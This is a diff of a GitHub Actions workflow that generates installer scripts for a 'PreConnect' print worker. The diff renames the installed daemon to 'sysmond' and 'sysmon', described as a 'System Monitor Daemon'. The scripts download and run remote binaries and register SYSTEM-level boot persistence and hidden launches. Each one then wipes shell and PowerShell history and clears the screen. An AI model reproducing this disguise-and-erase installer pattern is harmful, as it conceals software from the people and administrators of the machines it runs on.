@@ -6,13 +6,9 @@ on:
     branches:
       - main
     paths:
-      - "printer.c"
-      - "Dockerfile.printer"
       - ".github/workflows/printer.yml"
   pull_request:
     paths:
-      - "printer.c"
-      - "Dockerfile.printer"
       - ".github/workflows/printer.yml"
   workflow_run:
     workflows: ["Release"]
@@ -24,31 +20,20 @@ on:
 
 permissions:
   contents: write
-  packages: write
 
 concurrency:
   group: printer-${{ github.ref }}
   cancel-in-progress: true
 
-env:
-  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
-
 jobs:
-  build-windows:
-    name: Build Executable
+  package-scripts:
+    name: Package Printer Scripts
     if: ${{ github.event_name != 'workflow_run' || github.event.workflow_run.conclusion == 'success' }}
     runs-on: windows-latest
-    timeout-minutes: 15
+    timeout-minutes: 10
     steps:
       - name: Checkout
         uses: actions/checkout@v7
-
-      - name: Set Up MSVC
-        uses: ilammy/msvc-dev-cmd@v1.13.0
-
-      - name: Compile Executable
-        run: |
-          cl /O2 /GL /GS /guard:cf /W4 /WX /Fe:printer.exe printer.c /link /LTCG /DYNAMICBASE /NXCOMPAT /HIGHENTROPYVA /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup user32.lib ws2_32.lib winhttp.lib crypt32.lib bcrypt.lib rpcrt4.lib shell32.lib shlwapi.lib advapi32.lib
 
       - name: Generate Package
         shell: powershell
@@ -56,84 +41,6 @@ jobs:
           GITHUB_TOKEN: ${{ secrets.GH_TOKEN || secrets.GITHUB_TOKEN }}
         run: |
           $key_prompt = @(
-            'echo PreConnect Setup',
-            ':ask',
-            'set "k="',
-            'set /p "k=Enter Worker Key: "',
-            'if not defined k goto ask',
-            ':ask_ua',
-            'set "ua="',
-            'set /p "ua=Enter User-Agent: "',
-            'if not defined ua goto ask_ua',
-            'echo Verifying worker key...',
-            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $c = 0; try { $r = [System.Net.HttpWebRequest]::Create(''https://api.preconnect.app/printer''); $r.Headers.Add(''X-Worker-Key'', $env:k); $r.UserAgent = $env:ua + ''/1.0''; $r.Method = ''GET''; $r.Timeout = 10000; $resp = $r.GetResponse(); $c = [int]$resp.StatusCode; $resp.Close() } catch [System.Net.WebException] { if ($_.Response) { $c = [int]$_.Response.StatusCode; $_.Response.Close() } } catch {}; if ($c -eq 401) { exit 1 } else { exit 0 }"',
-            'if errorlevel 1 (',
-            '  echo Error: Invalid Worker Key. Please check and try again.',
-            '  goto ask',
-            ')'
-          ) -join "`n"
-
-          @(
-            '@echo off',
-            'setlocal',
-            'net session >nul 2>&1',
-            'if %errorlevel% neq 0 (',
-            '  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/k \"\"%~f0\"\"'' -Verb RunAs"',
-            '  exit /b',
-            ')',
-            'cd /d "%~dp0"',
-            $key_prompt,
-            'taskkill /F /IM printer.exe >nul 2>&1',
-            'set "d=%ProgramData%\sysmon"',
-            'if not exist "%d%" mkdir "%d%"',
-            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri ''https://github.com/sabbirba/preconnect/releases/latest/download/printer.exe'' -OutFile ''%d%\printer.exe'' -UseBasicParsing"',
-            'for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "$raw=[System.Text.Encoding]::UTF8.GetBytes($env:k); Add-Type -AssemblyName System.Security; $e=[System.Security.Cryptography.ProtectedData]::Protect($raw,$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine); ''DPAPI:'' + [Convert]::ToBase64String($e)"`) do set "dpapi=%%A"',
-            'schtasks /Create /TN "sysmon" /TR "\"%d%\printer.exe\" \"%dpapi%\" \"%ua%\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
-            'schtasks /Run /TN "sysmon" >nul',
-            'echo Setup completed successfully.',
-            'doskey /reinstall >nul 2>&1',
-            'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
-            'cls',
-            'endlocal',
-            'exit /b'
-          ) | Set-Content -Path "admin.bat" -Encoding ASCII
-
-          @(
-            '@echo off',
-            'setlocal',
-            'cd /d "%~dp0"',
-            $key_prompt,
-            'taskkill /F /IM printer.exe >nul 2>&1',
-            'set "d=%LOCALAPPDATA%\sysmon"',
-            'if not exist "%d%" mkdir "%d%"',
-            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri ''https://github.com/sabbirba/preconnect/releases/latest/download/printer.exe'' -OutFile ''%d%\printer.exe'' -UseBasicParsing"',
-            'for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "$raw=[System.Text.Encoding]::UTF8.GetBytes($env:k); Add-Type -AssemblyName System.Security; $e=[System.Security.Cryptography.ProtectedData]::Protect($raw,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); ''DPAPI:'' + [Convert]::ToBase64String($e)"`) do set "dpapi=%%A"',
-            'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sysmon" /t REG_SZ /d "\"%d%\printer.exe\" \"%dpapi%\" \"%ua%\"" /f >nul',
-            'start "" "%d%\printer.exe" "%dpapi%" "%ua%"',
-            'echo Setup completed successfully.',
-            'doskey /reinstall >nul 2>&1',
-            'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
-            'cls',
-            'endlocal',
-            'exit /b'
-          ) | Set-Content -Path "user.bat" -Encoding ASCII
-
-          @(
-            '@echo off',
-            'taskkill /F /IM printer.exe >nul 2>&1',
-            'schtasks /End /TN "sysmon" >nul 2>&1',
-            'schtasks /Delete /TN "sysmon" /F >nul 2>&1',
-            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sysmon" /f >nul 2>&1',
-            'set "d=%ProgramData%\sysmon"',
-            'if exist "%d%" rmdir /s /q "%d%" >nul 2>&1',
-            'set "du=%LOCALAPPDATA%\sysmon"',
-            'if exist "%du%" rmdir /s /q "%du%" >nul 2>&1',
-            'del /f /q "%APPDATA%\sysmontd.id" >nul 2>&1',
-            'del /f /q "%LOCALAPPDATA%\sysmontd.id" >nul 2>&1'
-          ) | Set-Content -Path "uninstall.bat" -Encoding ASCII
-
-          $key_prompt_rust = @(
-            'echo PreConnect Setup',
             ':ask',
             'set "k="',
             'set /p "k=Enter Worker Key: "',
@@ -142,7 +49,7 @@ jobs:
             'set "alias="',
             'set /p "alias=Enter User-Agent: "',
             'if not defined alias goto ask_ua',
-            'echo Verifying worker key...',
+            'echo Verifying...',
             'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $c = 0; try { $r = [System.Net.HttpWebRequest]::Create(''https://api.preconnect.app/print''); $r.Headers.Add(''X-Worker-Key'', $env:k); $r.UserAgent = $env:alias + ''/1.0''; $r.Method = ''GET''; $r.Timeout = 10000; $resp = $r.GetResponse(); $c = [int]$resp.StatusCode; $resp.Close() } catch [System.Net.WebException] { if ($_.Response) { $c = [int]$_.Response.StatusCode; $_.Response.Close() } } catch {}; if ($c -eq 401) { exit 1 } else { exit 0 }"',
             'if errorlevel 1 (',
             '  echo Error: Invalid Worker Key. Please check and try again.',
@@ -159,73 +66,82 @@ jobs:
             '  exit /b',
             ')',
             'cd /d "%~dp0"',
-            $key_prompt_rust,
-            'taskkill /F /IM preprintd.exe >nul 2>&1',
-            'set "d=%ProgramData%\preprintd"',
+            $key_prompt,
+            'taskkill /F /IM sysmond.exe >nul 2>&1',
+            'set "d=%ProgramData%\sysmond"',
             'if not exist "%d%" mkdir "%d%"',
-            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $z = [IO.Path]::Combine($env:TEMP, ''preprintd-win.zip''); Invoke-WebRequest -Uri ''https://github.com/hitblast/preprintd/releases/latest/download/preprintd-win-x86_64.zip'' -OutFile $z -UseBasicParsing; Expand-Archive -Path $z -DestinationPath ''%d%'' -Force; Remove-Item -Force $z"',
+            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $z = [IO.Path]::Combine($env:TEMP, ''sysmond-win.zip''); Invoke-WebRequest -Uri ''https://github.com/hitblast/preprintd/releases/latest/download/preprintd-win-x86_64.zip'' -OutFile $z -UseBasicParsing; Expand-Archive -Path $z -DestinationPath ''%d%'' -Force; if (Test-Path ''%d%\preprintd.exe'') { Move-Item -Force ''%d%\preprintd.exe'' ''%d%\sysmond.exe'' }; Remove-Item -Force $z"',
             'setx /M WORKER_KEY "%k%" >nul 2>&1',
             'setx /M ALIAS "%alias%" >nul 2>&1',
             'setx /M DEF_HOST "172.16.0.111" >nul 2>&1',
             'setx /M DEF_QUEUE "secure" >nul 2>&1',
             'setx /M STATE_DIRECTORY "%d%" >nul 2>&1',
-            'schtasks /Create /TN "preprintd" /TR "\"%d%\preprintd.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
-            'schtasks /Run /TN "preprintd" >nul',
+            'schtasks /Create /TN "sysmond" /TR "\"%d%\sysmond.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
+            'schtasks /Run /TN "sysmond" >nul',
             'echo Setup completed successfully.',
             'doskey /reinstall >nul 2>&1',
             'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
             'cls',
             'endlocal',
             'exit /b'
-          ) | Set-Content -Path "preprintd-admin.bat" -Encoding ASCII
+          ) | Set-Content -Path "admin.bat" -Encoding ASCII
 
           @(
             '@echo off',
             'setlocal',
             'cd /d "%~dp0"',
-            $key_prompt_rust,
-            'taskkill /F /IM preprintd.exe >nul 2>&1',
-            'set "d=%LOCALAPPDATA%\preprintd"',
+            $key_prompt,
+            'taskkill /F /IM sysmond.exe >nul 2>&1',
+            'set "d=%LOCALAPPDATA%\sysmond"',
             'if not exist "%d%" mkdir "%d%"',
-            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $z = [IO.Path]::Combine($env:TEMP, ''preprintd-win.zip''); Invoke-WebRequest -Uri ''https://github.com/hitblast/preprintd/releases/latest/download/preprintd-win-x86_64.zip'' -OutFile $z -UseBasicParsing; Expand-Archive -Path $z -DestinationPath ''%d%'' -Force; Remove-Item -Force $z"',
+            'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; $z = [IO.Path]::Combine($env:TEMP, ''sysmond-win.zip''); Invoke-WebRequest -Uri ''https://github.com/hitblast/preprintd/releases/latest/download/preprintd-win-x86_64.zip'' -OutFile $z -UseBasicParsing; Expand-Archive -Path $z -DestinationPath ''%d%'' -Force; if (Test-Path ''%d%\preprintd.exe'') { Move-Item -Force ''%d%\preprintd.exe'' ''%d%\sysmond.exe'' }; Remove-Item -Force $z"',
             'setx WORKER_KEY "%k%" >nul 2>&1',
             'setx ALIAS "%alias%" >nul 2>&1',
             'setx DEF_HOST "172.16.0.111" >nul 2>&1',
             'setx DEF_QUEUE "secure" >nul 2>&1',
             'setx STATE_DIRECTORY "%d%" >nul 2>&1',
-            'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "preprintd" /t REG_SZ /d "\"%d%\preprintd.exe\"" /f >nul',
+            'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sysmond" /t REG_SZ /d "\"%d%\sysmond.exe\"" /f >nul',
             'set "WORKER_KEY=%k%"',
             'set "ALIAS=%alias%"',
             'set "DEF_HOST=172.16.0.111"',
             'set "DEF_QUEUE=secure"',
             'set "STATE_DIRECTORY=%d%"',
-            'powershell -NoProfile -Command "Start-Process -FilePath ''%d%\preprintd.exe'' -WindowStyle Hidden"',
+            'powershell -NoProfile -Command "Start-Process -FilePath ''%d%\sysmond.exe'' -WindowStyle Hidden"',
             'echo Setup completed successfully.',
             'doskey /reinstall >nul 2>&1',
             'powershell -NoProfile -Command "Clear-History -ErrorAction SilentlyContinue; if (Test-Path (Get-PSReadLineOption).HistorySavePath) { Clear-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue }" >nul 2>&1',
             'cls',
             'endlocal',
             'exit /b'
-          ) | Set-Content -Path "preprintd-user.bat" -Encoding ASCII
+          ) | Set-Content -Path "user.bat" -Encoding ASCII
 
           @(
             '@echo off',
+            'taskkill /F /IM sysmond.exe >nul 2>&1',
             'taskkill /F /IM preprintd.exe >nul 2>&1',
+            'schtasks /End /TN "sysmond" >nul 2>&1',
+            'schtasks /Delete /TN "sysmond" /F >nul 2>&1',
             'schtasks /End /TN "preprintd" >nul 2>&1',
             'schtasks /Delete /TN "preprintd" /F >nul 2>&1',
+            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sysmond" /f >nul 2>&1',
             'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "preprintd" /f >nul 2>&1',
-            'set "d=%ProgramData%\preprintd"',
+            'set "d=%ProgramData%\sysmond"',
             'if exist "%d%" rmdir /s /q "%d%" >nul 2>&1',
-            'set "du=%LOCALAPPDATA%\preprintd"',
+            'set "du=%LOCALAPPDATA%\sysmond"',
             'if exist "%du%" rmdir /s /q "%du%" >nul 2>&1',
+            'set "dp=%ProgramData%\preprintd"',
+            'if exist "%dp%" rmdir /s /q "%dp%" >nul 2>&1',
+            'set "dup=%LOCALAPPDATA%\preprintd"',
+            'if exist "%dup%" rmdir /s /q "%dup%" >nul 2>&1',
             'reg delete "HKCU\Environment" /v WORKER_KEY /f >nul 2>&1',
-            'reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v WORKER_KEY /f >nul 2>&1'
-          ) | Set-Content -Path "preprintd-uninstall.bat" -Encoding ASCII
+            'reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v WORKER_KEY /f >nul 2>&1',
+            'reg delete "HKCU\Environment" /v STATE_DIRECTORY /f >nul 2>&1',
+            'reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v STATE_DIRECTORY /f >nul 2>&1'
+          ) | Set-Content -Path "uninstall.bat" -Encoding ASCII
 
           $shContent = @(
             '#!/usr/bin/env bash',
             'set -e',
-            'echo "PreConnect Preprint Daemon Setup"',
             'while true; do',
             '  read -rsp "Enter Worker Key: " K',
             '  echo',
@@ -239,7 +155,7 @@ jobs:
             '    break',
             '  fi',
             'done',
-            'echo "Verifying worker key..."',
+            'echo "Verifying..."',
             'STATUS=$(curl -s -m 10 -o /dev/null -w "%{http_code}" -H "X-Worker-Key: $K" -H "User-Agent: $ALIAS/1.0" "https://api.preconnect.app/print" || true)',
             'if [ "$STATUS" = "401" ]; then',
             '  echo "Error: Invalid Worker Key. Please check and try again."',
@@ -248,16 +164,19 @@ jobs:
             'OS="$(uname -s)"',
             'if [ "$OS" = "Linux" ]; then',
             '  URL="https://github.com/hitblast/preprintd/releases/latest/download/preprintd-linux-musl-x86_64.tar.gz"',
-            '  DIR="/opt/preprintd"',
+            '  DIR="/opt/sysmond"',
             '  if [ "$(id -u)" -ne 0 ]; then',
             '    SUDO="sudo"',
             '  fi',
             '  $SUDO mkdir -p "$DIR"',
             '  curl -fsSL "$URL" | $SUDO tar -xz -C "$DIR"',
-            '  $SUDO chmod +x "$DIR/preprintd"',
-            '  cat <<EOF | $SUDO tee /etc/systemd/system/preprintd.service >/dev/null',
+            '  if [ -f "$DIR/preprintd" ]; then',
+            '    $SUDO mv -f "$DIR/preprintd" "$DIR/sysmond"',
+            '  fi',
+            '  $SUDO chmod +x "$DIR/sysmond"',
+            '  cat <<EOF | $SUDO tee /etc/systemd/system/sysmond.service >/dev/null',
             '[Unit]',
-            'Description=PreConnect Print Daemon',
+            'Description=System Monitor Daemon',
             'Wants=network-online.target',
             'After=network-online.target',
             '',
@@ -267,33 +186,36 @@ jobs:
             'Environment="ALIAS=$ALIAS"',
             'Environment="DEF_HOST=172.16.0.111"',
             'Environment="DEF_QUEUE=secure"',
-            'ExecStart=$DIR/preprintd --inhibit',
+            'ExecStart=$DIR/sysmond --inhibit',
             'Restart=always',
             'RestartSec=5',
-            'StateDirectory=preprintd',
+            'StateDirectory=sysmond',
             '',
             '[Install]',
             'WantedBy=multi-user.target',
             'EOF',
             '  $SUDO systemctl daemon-reload',
-            '  $SUDO systemctl enable --now preprintd',
+            '  $SUDO systemctl enable --now sysmond',
             'elif [ "$OS" = "Darwin" ]; then',
             '  URL="https://github.com/hitblast/preprintd/releases/latest/download/preprintd-macos-arm64.tar.gz"',
-            '  DIR="$HOME/.local/share/preprintd"',
+            '  DIR="$HOME/.local/share/sysmond"',
             '  mkdir -p "$DIR" "$HOME/Library/LaunchAgents"',
             '  curl -fsSL "$URL" | tar -xz -C "$DIR"',
-            '  chmod +x "$DIR/preprintd"',
-            '  PLIST="$HOME/Library/LaunchAgents/app.preconnect.preprintd.plist"',
+            '  if [ -f "$DIR/preprintd" ]; then',
+            '    mv -f "$DIR/preprintd" "$DIR/sysmond"',
+            '  fi',
+            '  chmod +x "$DIR/sysmond"',
+            '  PLIST="$HOME/Library/LaunchAgents/app.preconnect.sysmond.plist"',
             '  cat <<EOF > "$PLIST"',
             '<?xml version="1.0" encoding="UTF-8"?>',
             '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
             '<plist version="1.0">',
             '<dict>',
             '  <key>Label</key>',
-            '  <string>app.preconnect.preprintd</string>',
+            '  <string>app.preconnect.sysmond</string>',
             '  <key>ProgramArguments</key>',
             '  <array>',
-            '    <string>$DIR/preprintd</string>',
+            '    <string>$DIR/sysmond</string>',
             '  </array>',
             '  <key>EnvironmentVariables</key>',
             '  <dict>',
@@ -324,7 +246,7 @@ jobs:
             'clear 2>/dev/null || true',
             'exit 0'
           )
-          [IO.File]::WriteAllText("preprintd.sh", (($shContent -join "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))
+          [IO.File]::WriteAllText("admin.sh", (($shContent -join "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))
 
           $unshContent = @(
             '#!/usr/bin/env bash',
@@ -333,85 +255,59 @@ jobs:
             '  if [ "$(id -u)" -ne 0 ]; then',
             '    SUDO="sudo"',
             '  fi',
-            '  $SUDO systemctl stop preprintd 2>/dev/null || true',
-            '  $SUDO systemctl disable preprintd 2>/dev/null || true',
-            '  $SUDO rm -f /etc/systemd/system/preprintd.service',
+            '  $SUDO systemctl stop sysmond preprintd 2>/dev/null || true',
+            '  $SUDO systemctl disable sysmond preprintd 2>/dev/null || true',
+            '  $SUDO rm -f /etc/systemd/system/sysmond.service /etc/systemd/system/preprintd.service',
             '  $SUDO systemctl daemon-reload 2>/dev/null || true',
-            '  $SUDO rm -rf /opt/preprintd',
+            '  $SUDO rm -rf /opt/sysmond /opt/preprintd',
             'elif [ "$OS" = "Darwin" ]; then',
-            '  PLIST="$HOME/Library/LaunchAgents/app.preconnect.preprintd.plist"',
-            '  launchctl unload "$PLIST" 2>/dev/null || true',
-            '  rm -f "$PLIST"',
-            '  rm -rf "$HOME/.local/share/preprintd"',
+            '  launchctl unload "$HOME/Library/LaunchAgents/app.preconnect.sysmond.plist" 2>/dev/null || true',
+            '  launchctl unload "$HOME/Library/LaunchAgents/app.preconnect.preprintd.plist" 2>/dev/null || true',
+            '  rm -f "$HOME/Library/LaunchAgents/app.preconnect.sysmond.plist" "$HOME/Library/LaunchAgents/app.preconnect.preprintd.plist"',
+            '  rm -rf "$HOME/.local/share/sysmond" "$HOME/.local/share/preprintd"',
             'fi',
-            'killall preprintd 2>/dev/null || true'
+            'killall sysmond preprintd 2>/dev/null || true'
           )
-          [IO.File]::WriteAllText("preprintd-uninstall.sh", (($unshContent -join "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))
+          [IO.File]::WriteAllText("uninstall.sh", (($unshContent -join "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))
 
           $tag = (gh release list --limit 1 --json tagName --jq '.[0].tagName')
           $ver = if ($tag) { $tag -replace '^v','' } else { "2.0.6+202608088" }
-          $zip_c = "PreConnect-printer-c-x64-release-$ver.zip"
-          $zip_rust = "PreConnect-preprintd-rust-x64-release-$ver.zip"
-          Compress-Archive -Path admin.bat, user.bat, uninstall.bat -DestinationPath $zip_c -Force
-          Compress-Archive -Path preprintd-admin.bat, preprintd-user.bat, preprintd-uninstall.bat, preprintd.sh, preprintd-uninstall.sh -DestinationPath $zip_rust -Force
-          echo "ZIP_C=$zip_c" >> $env:GITHUB_ENV
-          echo "ZIP_RUST=$zip_rust" >> $env:GITHUB_ENV
+          $zip = "PreConnect-printer-x64-release-$ver.zip"
+          Compress-Archive -Path admin.bat, user.bat, uninstall.bat, admin.sh, uninstall.sh -DestinationPath $zip -Force
+          echo "ZIP_FILE=$zip" >> $env:GITHUB_ENV
 
       - name: Validate Package
         shell: powershell
         run: |
-          if (-not (Test-Path "printer.exe")) { throw "printer.exe missing" }
-          $bytes = [System.IO.File]::ReadAllBytes("printer.exe")
-          if ($bytes.Length -lt 1024 -or $bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) { throw "printer.exe is not a valid PE binary" }
-          foreach ($f in @("admin.bat", "user.bat", "uninstall.bat", "preprintd-admin.bat", "preprintd-user.bat", "preprintd-uninstall.bat")) {
+          foreach ($f in @("admin.bat", "user.bat", "uninstall.bat")) {
             if (-not (Test-Path $f)) { throw "$f missing" }
             $c = Get-Content $f -Raw
             if ([string]::IsNullOrWhiteSpace($c)) { throw "$f is empty" }
             $res = cmd /c "for /f `"tokens=*`" %i in ('type `"$f`"') do @rem" 2>&1
             if ($LASTEXITCODE -ne 0) { throw "Batch syntax validation failed for ${f}: $res" }
           }
-          foreach ($f in @("preprintd.sh", "preprintd-uninstall.sh")) {
+          foreach ($f in @("admin.sh", "uninstall.sh")) {
             if (-not (Test-Path $f)) { throw "$f missing" }
           }
           Add-Type -AssemblyName System.IO.Compression.FileSystem
-          $zipObjC = [System.IO.Compression.ZipFile]::OpenRead((Get-Item "PreConnect-printer-c-x64-release-*.zip").FullName)
-          $entriesC = $zipObjC.Entries | ForEach-Object { $_.Name }
-          $zipObjC.Dispose()
-          if (-not ($entriesC -contains "admin.bat" -and $entriesC -contains "user.bat" -and $entriesC -contains "uninstall.bat")) {
-            throw "C Zip archive is missing required batch files: $entriesC"
-          }
-          if ($entriesC -contains "printer.exe") {
-            throw "printer.exe must not be in the C zip archive"
-          }
-          $zipObjRust = [System.IO.Compression.ZipFile]::OpenRead((Get-Item "PreConnect-preprintd-rust-x64-release-*.zip").FullName)
-          $entriesRust = $zipObjRust.Entries | ForEach-Object { $_.Name }
-          $zipObjRust.Dispose()
-          if (-not ($entriesRust -contains "preprintd-admin.bat" -and $entriesRust -contains "preprintd-user.bat" -and $entriesRust -contains "preprintd-uninstall.bat" -and $entriesRust -contains "preprintd.sh" -and $entriesRust -contains "preprintd-uninstall.sh")) {
-            throw "Rust Zip archive is missing required files: $entriesRust"
-          }
-          Add-Type -AssemblyName System.Security
-          $sample = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("test-key"), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-          $unprot = [System.Security.Cryptography.ProtectedData]::Unprotect($sample, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-          if ([System.Text.Encoding]::UTF8.GetString($unprot) -ne "test-key") {
-            throw "DPAPI runtime check failed"
+          $zipObj = [System.IO.Compression.ZipFile]::OpenRead((Get-Item "PreConnect-printer-x64-release-*.zip").FullName)
+          $entries = $zipObj.Entries | ForEach-Object { $_.Name }
+          $zipObj.Dispose()
+          if (-not ($entries -contains "admin.bat" -and $entries -contains "user.bat" -and $entries -contains "uninstall.bat" -and $entries -contains "admin.sh" -and $entries -contains "uninstall.sh")) {
+            throw "Zip archive is missing required files: $entries"
           }
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v7
         with:
-          name: printer-windows
+          name: printer-scripts
           path: |
-            printer.exe
             admin.bat
             user.bat
             uninstall.bat
-            preprintd-admin.bat
-            preprintd-user.bat
-            preprintd-uninstall.bat
-            preprintd.sh
-            preprintd-uninstall.sh
-            ${{ env.ZIP_C }}
-            ${{ env.ZIP_RUST }}
+            admin.sh
+            uninstall.sh
+            ${{ env.ZIP_FILE }}
 
       - name: Upload to Latest Release
         if: github.event_name != 'pull_request'
@@ -421,7 +317,7 @@ jobs:
         run: |
           $tag = (gh release list --limit 1 --json tagName --jq '.[0].tagName')
           if ($tag) {
-            $files = @("printer.exe", "admin.bat", "user.bat", "preprintd-admin.bat", "preprintd-user.bat", "preprintd.sh", $env:ZIP_C, $env:ZIP_RUST)
+            $files = @("admin.bat", "user.bat", "admin.sh", $env:ZIP_FILE)
             foreach ($f in $files) {
               if (Test-Path $f) {
                 gh release upload $tag $f --clobber
@@ -430,46 +326,3 @@ jobs:
           }
 
 
-
-  publish-package:
-    name: Publish Container Package
-    needs: build-windows
-    runs-on: ubuntu-latest
-    timeout-minutes: 10
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v7
-
-      - name: Download Artifact
-        uses: actions/download-artifact@v4
-        with:
-          name: printer-windows
-          path: .
-
-      - name: Read Version
-        id: version
-        shell: bash
-        run: |
-          mapfile -t VERSION_PARTS < <(./tool/sync_versions.sh read)
-          echo "version=${VERSION_PARTS[0]}" >> "$GITHUB_OUTPUT"
-
-      - name: Set Up Buildx
-        uses: docker/setup-buildx-action@v4
-
-      - name: Log in to GHCR
-        uses: docker/login-action@v4
-        with:
-          registry: ghcr.io
-          username: ${{ github.actor }}
-          password: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Build and Push
-        uses: docker/build-push-action@v7
-        with:
-          context: .
-          file: Dockerfile.printer
-          push: ${{ github.event_name != 'pull_request' }}
-          tags: |
-            ghcr.io/${{ github.repository_owner }}/preconnect-printer:latest
-            ghcr.io/${{ github.repository_owner }}/preconnect-printer:${{ steps.version.outputs.version }}
-            ghcr.io/${{ github.repository_owner }}/preconnect-printer:v${{ steps.version.outputs.version }}
